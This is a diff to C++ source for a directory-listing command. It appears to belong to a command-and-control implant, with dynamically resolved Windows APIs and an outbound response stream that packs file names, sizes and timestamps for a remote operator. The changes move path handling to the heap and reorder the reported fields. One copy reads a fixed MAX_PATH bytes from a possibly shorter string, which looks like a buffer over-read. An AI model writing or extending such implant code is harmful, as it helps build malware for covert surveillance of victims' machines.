@@ -4,11 +4,11 @@ namespace Commands {
     VOID DirectoryList (PPARSER Parser) {
         HEXANE
 
-        PSTREAM Outbound          = Stream::CreateStreamWithHeaders(TypeResponse);
+        PSTREAM Outbound        = Stream::CreateStreamWithHeaders(TypeResponse);
+        LPSTR Target            = { };
+        LPSTR Path              = { };
         ULONG PathSize          = { };
-        CHAR Path[MAX_PATH]     = { };
 
-        INT Counter             = { };
         HANDLE File             = { };
         WIN32_FIND_DATAA Next   = { };
         ULARGE_INTEGER FileSize = { };
@@ -17,8 +17,11 @@ namespace Commands {
 
         Stream::PackDword(Outbound, CommandDir);
 
-        if ((B_PTR(Parser->Handle))[0] == PERIOD) {
-            if (!(PathSize = Ctx->win32.GetCurrentDirectoryA(MAX_PATH * 2, Path))) {
+        Path    = (LPSTR) Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, MAX_PATH);
+        Target  = Parser::UnpackString(Parser, nullptr);
+
+        if (Target[0] == PERIOD) {
+            if (!(PathSize = Ctx->win32.GetCurrentDirectoryA(MAX_PATH, Path))) {
                 return_defer(ERROR_DIRECTORY);
             }
 
@@ -28,9 +31,12 @@ namespace Commands {
 
             Path[PathSize++]  = ASTER;
             Path[PathSize]    = NULTERM;
+
+        } else {
+            x_memcpy(Path, Target, MAX_PATH);
         }
 
-        if ((File = Ctx->win32.FindFirstFileA(Parser::UnpackString(Parser, nullptr), &Next)) == INVALID_HANDLE_VALUE) {
+        if ((File = Ctx->win32.FindFirstFileA(Path, &Next)) == INVALID_HANDLE_VALUE) {
             return_defer(ERROR_FILE_NOT_FOUND);
         }
 
@@ -42,25 +48,23 @@ namespace Commands {
             }
 
             if (Next.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-                Stream::PackBool(Outbound, TRUE);
+                Stream::PackDword(Outbound, TRUE);
 
             } else {
                 FileSize.HighPart   = Next.nFileSizeHigh;
                 FileSize.LowPart    = Next.nFileSizeLow;
 
-                Stream::PackBool(Outbound, FALSE);
+                Stream::PackDword(Outbound, FALSE);
                 Stream::PackDword64(Outbound, FileSize.QuadPart);
             }
 
-            Stream::PackDword(Outbound, FileTime.wDay);
             Stream::PackDword(Outbound, FileTime.wMonth);
+            Stream::PackDword(Outbound, FileTime.wDay);
             Stream::PackDword(Outbound, FileTime.wYear);
-            Stream::PackDword(Outbound, SysTime.wSecond);
-            Stream::PackDword(Outbound, SysTime.wMinute);
             Stream::PackDword(Outbound, SysTime.wHour);
+            Stream::PackDword(Outbound, SysTime.wMinute);
+            Stream::PackDword(Outbound, SysTime.wSecond);
             Stream::PackString(Outbound, Next.cFileName);
-
-            Counter++;
 
         } while (Ctx->win32.FindNextFileA(File, &Next) != 0);
 
@@ -69,6 +73,9 @@ namespace Commands {
 
         if (File) {
             Ctx->win32.FindClose(File);
+        }
+        if (Path) {
+            Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, Path);
         }
     }
 
